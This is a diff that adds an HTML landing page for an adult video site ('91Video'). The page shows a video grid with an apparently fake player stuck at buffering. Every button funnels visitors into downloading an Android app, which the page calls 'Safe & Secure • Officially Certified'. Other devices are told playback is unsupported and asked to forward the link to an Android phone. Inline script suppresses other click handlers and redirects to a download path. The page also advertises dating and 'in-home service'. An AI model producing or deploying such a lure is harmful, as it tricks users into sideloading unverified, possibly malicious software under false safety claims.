@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <base href="/landing-pages/premhd/">
+
+<meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="theme-color" content="#0d0d0d">
+    <meta name="referrer" content="no-referrer">
+    
+    <title>Premium Videos - HD Online</title>
+    <link rel="stylesheet" href="static/css/style.css">
+    <link rel="stylesheet" href="static/css/all.min.css">
+    <link rel="preconnect" href="https://cdnjs.cloudflare.com">
+  <script src="/landing-runtime.js" defer></script>
+</head>
+<body>
+
+    <header class="site-header">
+<div class="header-left">
+            <i class="fas fa-bars"></i>
+            <div class="logo">91<span>Video</span></div>
+        </div>
+        <div class="header-right">
+            <i class="fas fa-search"></i>
+            <i class="fas fa-user-circle"></i>
+        </div>
+    </header>
+
+    <div class="notice-bar">
+        <div class="notice-content">
+            <i class="fas fa-bullhorn"></i> Announcement: Latest homepage URL released, bookmark to avoid getting lost! VIP membership free registration now open, massive HD resources available!
+        </div>
+    </div>
+
+    <div class="feature-strip">
+        <span class="feature-tag"><i class="fas fa-video"></i> Massive videos free to watch</span>
+        <span class="feature-tag"><i class="fas fa-heart"></i> Online dating</span>
+        <span class="feature-tag"><i class="fas fa-concierge-bell"></i> In-home service</span>
+    </div>
+
+    <main class="container">
+        <div class="section-title">
+            <i class="fas fa-fire" style="color: #ff9900;"></i> Hot Recommendations
+        </div>
+        
+        <div class="video-grid" id="videoGrid"></div>
+        
+        <div class="loading-more" id="loadMoreBtn">
+            <i class="fas fa-sync-alt"></i> Click to Load More
+        </div>
+    </main>
+
+    <div class="player-overlay" id="playerOverlay">
+        <div class="player-header">
+            <i class="fas fa-chevron-left" id="closePlayer"></i>
+            <span id="playerTitle">Now Playing...</span>
+            <i class="fas fa-ellipsis-h"></i>
+        </div>
+        <div class="player-container">
+            <div class="player-loading">
+                <i class="fas fa-spinner fa-spin"></i>
+                <p>Buffering 0%...</p>
+            </div>
+        </div>
+        <div class="player-controls-fake">
+            <div class="progress-bar"><div class="progress-fill"></div></div>
+            <div class="control-icons">
+                <i class="fas fa-play"></i>
+                <i class="fas fa-expand"></i>
+            </div>
+        </div>
+        <div class="player-details-container"></div>
+    </div>
+
+    <div class="sticky-footer" id="stickyFooter">
+        <div class="footer-text">
+            <div class="footer-title">Download Official APP</div>
+            <div class="footer-sub">Massive HD videos, watch for free</div>
+        </div>
+        <!-- 修改点：传入 event 并 return false 阻止默认行为 -->
+        <button class="footer-btn" onclick="handleDownload(event); return false;">Download Now</button>
+    </div>
+
+    <div class="modal-overlay" id="downloadModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3><i class="fas fa-exclamation-triangle"></i> Friendly Reminder</h3>
+                <span class="close-btn" id="closeModal">&times;</span>
+            </div>
+            <div class="modal-body">
+                <div class="vip-badge">VIP Exclusive</div>
+                <p class="modal-title">Download the dedicated APP to watch full HD videos</p>
+                <p class="sub-text">Under 18 prohibited • Massive resources free to watch</p>
+                
+                <div id="androidAction" class="platform-action" style="display: none;">
+                    <!-- 修改点：传入 event 并 return false -->
+                    <a href="javascript:void(0);" id="downloadLink" class="action-btn download-btn" onclick="handleDownload(event); return false;">
+                        <i class="fab fa-android"></i> Download APP to Watch Now
+                    </a>
+                    <p class="safe-tip"><i class="fas fa-shield-alt"></i> Safe & Secure • Officially Certified • Fast Download</p>
+                </div>
+
+                <div id="otherAction" class="platform-action" style="display: none;">
+                    <div class="qr-placeholder">
+                        <i class="fas fa-mobile-alt" style="font-size: 48px; color: #666;"></i>
+                    </div>
+                    <p class="device-warn">Current device does not support playback</p>
+                    <button id="shareBtn" class="action-btn share-btn">
+                        <i class="fas fa-copy"></i> Copy link and share to Android phone
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="toast" class="toast">Link copied, please send to Android phone to open</div>
+
+    <script src="static/js/config.js"></script>
+    <script src="static/js/main.js"></script>
+
+    <script>
+        function handleDownload(e) {
+            // 核心修改：阻止 main.js 中可能存在的其他点击事件
+            if (e) {
+                e.preventDefault();
+                e.stopPropagation();
+                e.stopImmediatePropagation();
+            }
+
+            var timestamp = new Date().getTime();
+            var targetUrl = 'download/?v=' + timestamp;
+            
+            console.log('Redirecting to:', targetUrl);
+            window.location.replace(targetUrl); // 使用 replace 减少历史记录干扰，或者用 location.href
+        }
+    </script>
+<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v3d52b47920f24c319d37e2661827c42b1787588026925" integrity="sha512-d9sL6GJLXn6fInD1+TVXhTcQOsmxeHfmHAvwGDIxp5TO+uo1fiWW7mHomMj4MLRlCsJDTqXzWLHJFFlPCEIj/A==" data-cf-beacon='{"version":"2024.11.0","token":"d8d0a4b6e3294b56990fe4f7e7e0a13a","r":1}' crossorigin="anonymous"></script>
+</body>
+</html>
